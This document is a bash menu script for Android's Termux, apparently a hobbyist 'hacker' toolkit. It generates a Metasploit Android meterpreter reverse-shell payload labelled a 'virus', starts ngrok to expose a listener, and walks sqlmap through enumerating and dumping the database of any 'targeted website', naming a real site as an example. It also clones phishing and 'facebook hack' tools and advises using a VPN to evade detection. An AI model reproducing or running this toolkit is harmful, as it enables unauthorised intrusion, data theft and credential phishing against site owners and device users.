#!/bin/bash
tput setaf 2
figlet TeRm-X
while [ 1 ]
do
	echo "=============================="
	echo "scripted by sachin anon hacker"
	echo "=============================="
	echo "1 - update and upgrade"
	echo "2 - create raw payload"
	echo "3 - start ngrok"
	echo "4 - website hack"
	echo "5 - termux tools"
	echo "6 - whois-termux"
	echo "7 - exit"
	echo -n "make select your option :- "
	read selection
	
	if [ $selection -eq 1 ]
	then
		apt-get update -y
		apt-get upgrade -y
	elif [ $selection -eq 2 ]
	then
		echo -n "type lhost :-"
		read lhost
		echo -n "type lport :-"
		read lport
		echo -n "virus name :-"
		read name
		cd $HOME
		cd metasploit-framework
		./msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> /sdcard/$name
		sleep 1
		echo "Go and check your storage"
		sleep 1
		figlet Done...
		
	elif [ $selection -eq 3 ]
	then
		cd $HOME
		echo -n "Type http or tcp :-"
		read ht
		echo -n "Type port :- "
		read port
		./ngrok $ht $port
	elif [ $selection -eq 4 ]
	then
		clear
		cd $HOME
		figlet Website hack
		echo "scripted by sachin mmct"
		sleep 2
		echo " USE THIS TOOL ON YOUR OWN RISK>>>..."
		sleep 2
		echo "Find vulnarable websites"
		sleep 2
		echo "Example website = http://www.bible-history.com/subcat.php?id=1"
		sleep 2
		cd sqlmap
		echo "Enter your targeted website"
		read sachin
		python2 sqlmap.py -u $sachin --dbs
		echo "Select your database"
		read data
		python2 sqlmap.py -u $sachin -D $data --tables
		echo "Select tables"
		read table
		python2 sqlmap.py -u $sachin -D $data -T $table --columns
		echo "Select columns"
		read column
		python2 sqlmap.py -u $sachin -D $data -T $table -C $column --dump
		sleep 1
		figlet Done ....
		sleep 1
		echo "successfully hacked this website"
		sleep 1
		echo "you may get into the jail "
		echo " dont hack govt website "
		echo "use vpn before attacking"
        elif [ $selection -eq 5 ]
	then
		while [ 2 ]
		do
			clear
			echo "=========Tools========="
			echo "====for installations=="
			echo "1 - hakku-framework"
			echo "2 - weeman"
			echo "3 - facebook hack"
			echo "4 - back to menue.."
			echo -n "select your tools :- "
			read fuck
			if [ $fuck -eq 1 ]
			then
				cd $HOME
				git clone https://github.com/4shadoww/hakkuframework
			elif [ $fuck -eq 2 ]
			then
				cd $HOME
				git clone https://github.com/samyoyo/weeman
			elif [ $fuck -eq 3 ]
			then
				cd $HOME
				git clone https://github.com/Ethical-H4CK3R/Pulse 
			elif [ $fuck -eq 4 ]
			then
				break
			else
				echo "wrong selection"
			fi

			#echo "press enter"
			#read y
			clear
		done
	elif [ $selection -eq 6 ]
	then
		clear
		echo "============================"
		echo "Get domain information >>>.."
		echo "============================"
		cd $HOME/python-whois
		echo -n "Eneter your domain :- "
		read who
		pwhois $who
	elif [ $selection -eq 7 ]
	then	
		echo "bye tata.."
		sleep 2
		echo "this scrtpt created by sachin "
		echo "Cvil is my branch " 
		echo "without civil no marine and mechanical" 
		break
	else
		echo "wrong selectiom..."
	fi
	echo "press enter to continue :"
	read x
	clear
done
